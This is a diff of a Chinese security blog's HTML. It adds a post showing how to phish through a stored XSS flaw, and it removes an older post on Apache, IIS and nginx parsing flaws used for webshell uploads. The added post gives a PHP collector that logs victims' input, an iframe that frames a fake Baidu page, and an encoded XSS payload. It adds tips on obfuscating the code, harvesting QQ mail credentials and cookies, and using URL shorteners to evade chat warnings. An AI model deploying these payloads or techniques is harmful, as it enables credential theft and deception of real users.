class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"dd"</span>&gt;</span></span><br><span class="line"> 	◎2018 Baidu <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>使用百度前必读<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>意见反馈<span class="tag">&lt;/<span class="name">a</span>&gt;</span>京ICP证030173号<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/jing01.png"</span> /&gt;</span> 京公网安备110000002000001号<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/jing01.png"</span>/&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	 </span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>接收数据的baidu.php,接收了搜索的关键字wd以添加的方式写入baidu_search.txt并控制js跳转到真正搜索这个关键词的百度页面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$wd = urlencode($_REQUEST[&apos;wd&apos;]);</span><br><span class="line">$log = fopen(&quot;baidu_search.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($log, $wd . &quot;\r\n&quot;);</span><br><span class="line">fclose($log);</span><br><span class="line"></span><br><span class="line">#echo $wd;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;script language=&quot;javascript&quot;&gt;&apos;;</span><br><span class="line">echo &quot;location.href=&apos;https://www.baidu.com/s?wd=&quot;.$wd.&quot;&amp;rsv_spt=1&amp;rsv_iqid=0xcd9013d50001ba80&amp;issp=1&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_sug3=5&amp;rsv_sug1=2&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;inputT=805&amp;rsv_sug4=816&apos;&quot;;</span><br><span class="line">echo &apos;&lt;/script&gt;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>百度页面目前的样子：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing11.png" alt=""></p>
+<p>ps:其中baidu.html中用到的图片我放到github上面了 <a href="https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC" target="_blank" rel="noopener">https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC</a> </p>
+<p>ps2:包括一个完整的qq邮箱前端后端钓鱼代码也写到了这个github目录里面，可以拿去学习，如果用于非法用途造成的后果与本人无关，展示效果如下：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing11-1.png" alt=""></p>
+<p>至此环境搭建完成。</p>
+<h2 id="0x04-复现-钓鱼过程"><a href="#0x04-复现-钓鱼过程" class="headerlink" title="0x04 复现-钓鱼过程"></a>0x04 复现-钓鱼过程</h2><p>我们要复现这个攻击过程需要将js代码写入这个存储型xss漏洞中，这个代码的功能需要做到将我们服务器的baidu.html通过iframe框架调用过来。</p>
+<p>那么我们先写一个调用baidu.html的iframe.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">body&#123;</span></span><br><span class="line"><span class="undefined">      margin:0px;</span></span><br><span class="line"><span class="undefined">	  border:0px;</span></span><br><span class="line"><span class="undefined">	  padding:0px;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">iframe&#123;border:0px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/xss/hk/baidu.html"</span> <span class="attr">id</span>=<span class="string">"iframepage"</span> <span class="attr">name</span>=<span class="string">"iframepage"</span>  <span class="attr">width</span>=<span class="string">"101%"</span> <span class="attr">height</span>=<span class="string">"101%"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这个页面可以将伪造的百度页面整体拉到我们目前页面中。</p>
+<p>想将他用到xss漏洞，需要先将iframe.html页面整个url编码一次。</p>
+<p>然后将编码好的内容写到这个函数里，再整体写在刚才存在xss漏洞的留言页面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.onload=function()&#123;document.write(decodeURI(&quot;%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv=%22Content-Type%22%20content=%22text/html;%20charset=utf-8%22%20/%3E%20%0A%3Ctitle%3E%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93%3C/title%3E%0A%3Clink%20rel=%22icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Clink%20rel=%22shortcut%20icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Cstyle%3Ebody%7B%0A%20%20%20%20%20%20margin:0px;%0A%09%20%20border:0px;%0A%09%20%20padding:0px;%0A%20%20%7D%0Aiframe%7Bborder:0px;%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Ciframe%20src=%22http://127.0.0.1/xss/hk/baidu.html%22%20id=%22iframepage%22%20name=%22iframepage%22%20%20width=%22101%25%22%20height=%22101%25%22%20%3E%3C/iframe%3E%0A%3C/body%3E%0A%3C/html%3E&quot;))&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing12.png" alt=""></p>
+<p>下来我们将这个留言界面的网址，通过新浪短链接等工具生成一个短链接发送给别人，这里就发给我自己进行测试吧。</p>
+<p>打开链接发现留言系统的页面已经变成了自己搭建好的伪造百度页面，但是网址还是存在xss漏洞的网址。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing13.png" alt=""></p>
+<p>这个时候我们搜索：黑暗剑21</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing14.png" alt=""></p>
+<p>然后就会发现跳转到了真正的百度搜索中，返回的词条也一致。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing15.png" alt=""></p>
+<p>最后我们打开刚才存储数据的txt文件，发现多出一条 %E9%BB%91%E6%9A%97%E5%89%9121 </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing16.png" alt=""></p>
+<p>解码之后就是黑暗剑21。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing17.png" alt=""></p>
+<p>至此我们一个完整的钓鱼流程就结束了。</p>
+<h2 id="0x05-额外技巧"><a href="#0x05-额外技巧" class="headerlink" title="0x05 额外技巧"></a>0x05 额外技巧</h2><ul>
+<li><p>如果我们不想让别人轻易从存在xss存储漏洞页面通过源代码轻易看出我们的目的，我们就需要通过代码混淆和加密的方式将代码伪造一番。</p>
+</li>
+<li><p>如果我们将伪造的页面换成qq邮箱，qq空间等用来钓鱼账号密码，那么就得将接收数据的php页面写成接收好数据保存，然后通过代理的方式向真正的页面提交请求，得到返回的cookie再跳转登陆。</p>
+</li>
+<li><p>要发给别人的钓鱼链接最好通过腾讯、新浪等公司提供的短链接生成器，这样不会在聊天窗口变成红色感叹号，甚至会变成绿色安全符号。</p>
+</li>
+</ul>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>网络钓鱼是最常见的盗号手段，对大部分具备网络安全意识的人很难起作用，但是如果这个网站制作的极其逼真，又是在一些知名公司挖到的存储型xss漏洞上布置的，很多人看到是正规的大公司域名，是不是就非常容易钓鱼成功呢？</p>
+<p>所以面对不明链接的时候，要提升自己的安全意识，能不点则不点，更不要轻易输入账号密码和个人信息。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/19/数据库备份getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1834,9 +2094,9 @@
           
             <h2 id="0x00-XML"><a href="#0x00-XML" class="headerlink" title="0x00 XML"></a>0x00 XML</h2><p>XML是可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言，与HTML的不同在于XML被设计用来传输和存储数据而HTML被设计用来显示数据。</p>
 <p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
-<p>XML声明即是位于XML文档开始部分的第一行，规定了xml版本和编码格式。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>XML声明即是位于XML文档开始部分的第一行，规定了xml版本和编码格式。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
 <p>DTD(Document Type Definition) 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p>
-<p>文档元素即下面例子中note中所有部分，每个xml文档必须包含一个根元素，下面的例子中根元素就是note<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>文档元素即下面例子中note中所有部分，每个xml文档必须包含一个根元素，下面的例子中根元素就是note<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="0x01-DTD-Document-Type-Definition"><a href="#0x01-DTD-Document-Type-Definition" class="headerlink" title="0x01 DTD(Document Type Definition)"></a>0x01 DTD(Document Type Definition)</h2><p>上面我们只是简要说了一下XML的结构，下来我们拿出我们重点关注的DTD文档类型定义来详细说明一下。</p>
 <h4 id="DTD-引用方式"><a href="#DTD-引用方式" class="headerlink" title="DTD 引用方式"></a>DTD 引用方式</h4><ul>
 <li><p>1.DTD 内部声明</p>
@@ -2150,207 +2410,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/01/解析漏洞总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/01/解析漏洞总结/" itemprop="url">
-                  解析漏洞总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-01T21:47:29+08:00">
-                2018-05-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/01/解析漏洞总结/" class="leancloud_visitors" data-flag-title="解析漏洞总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-服务器解析漏洞"><a href="#0x00-服务器解析漏洞" class="headerlink" title="0x00 服务器解析漏洞"></a>0x00 服务器解析漏洞</h2><p>服务器解析漏洞一般是服务器自身或扩展组件带来的漏洞，配合文件上传等漏洞就会产生很大的危害。</p>
-<p>我们这里整理常见的服务器apache、IIS、nginx的解析漏洞。</p>
-<h2 id="0x01-apache"><a href="#0x01-apache" class="headerlink" title="0x01 apache"></a>0x01 apache</h2><h4 id="一、不可识别解析"><a href="#一、不可识别解析" class="headerlink" title="一、不可识别解析"></a>一、不可识别解析</h4><p>apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
-<p>apache版本在以下范围内</p>
-<ul>
-<li>Apache 2.0.x &lt;= 2.0.59</li>
-<li>Apache 2.2.x &lt;= 2.2.17</li>
-<li>Apache 2.2.2 &lt;= 2.2.8</li>
-</ul>
-<p>都可以通过上传xxx.php.rar或xxx.php+任意无法解析后缀解析为php。</p>
-<h4 id="二、配置问题"><a href="#二、配置问题" class="headerlink" title="二、配置问题"></a>二、配置问题</h4><ul>
-<li>1.如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</li>
-<li>2.如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</li>
-</ul>
-<h2 id="0x02-IIS"><a href="#0x02-IIS" class="headerlink" title="0x02 IIS"></a>0x02 IIS</h2><h4 id="一、目录解析"><a href="#一、目录解析" class="headerlink" title="一、目录解析"></a>一、目录解析</h4><p>在IIS-6.0的版本，在.asp或.asa文件夹下的所有类型后缀文件全部解析为.asp文件。</p>
-<h4 id="二、文件解析"><a href="#二、文件解析" class="headerlink" title="二、文件解析"></a>二、文件解析</h4><p>在IIS-6.0的版本，服务器默认不解析;后面的内容，所以xxx.asp;.jpg会被解析成xxx.asp。</p>
-<h4 id="三、其他解析类型"><a href="#三、其他解析类型" class="headerlink" title="三、其他解析类型"></a>三、其他解析类型</h4><p>在IIS6.0的版本，如下几种文件类型也会被执行。</p>
-<ul>
-<li>xxx.asa</li>
-<li>xxx.cer</li>
-<li>xxx.cdx</li>
-</ul>
-<h4 id="四、php-cgi漏洞"><a href="#四、php-cgi漏洞" class="headerlink" title="四、php-cgi漏洞"></a>四、php-cgi漏洞</h4><p>在IIS-7.0和IIS-7.5的版本，在php配置文件中，开启cgi.fix_pathinfo，然后上传一个1.jpg的一句话木马文件。然后用菜刀访问1.jpg/.php即可连接一句话木马。</p>
-<h2 id="0x03-nginx"><a href="#0x03-nginx" class="headerlink" title="0x03 nginx"></a>0x03 nginx</h2><h4 id="一、低版本nginx"><a href="#一、低版本nginx" class="headerlink" title="一、低版本nginx"></a>一、低版本nginx</h4><p>nginx 0.5.x、nginx 0.6.x中可以通过在任意文件名后面增加%00.php解析为php</p>
-<h4 id="二、php-cgi漏洞"><a href="#二、php-cgi漏洞" class="headerlink" title="二、php-cgi漏洞"></a>二、php-cgi漏洞</h4><p>和IIS的第四点相同，在php配置文件中，开启了cgi.fix_pathinfo，导致图片马1.jpg可以通过访问1.jpg/.php解析成php</p>
-<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><ul>
-<li>1.对于php-cgi漏洞，可以修改php.ini文件，将cgi.fix_pathinfo的值设置为0</li>
-<li>2.使用白名单匹配文件后缀名</li>
-<li>3.可以对上传后的文件固定后缀之前的所有字符进行重命名</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2400,7 +2459,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">63</span>
+                <span class="site-state-item-count">64</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
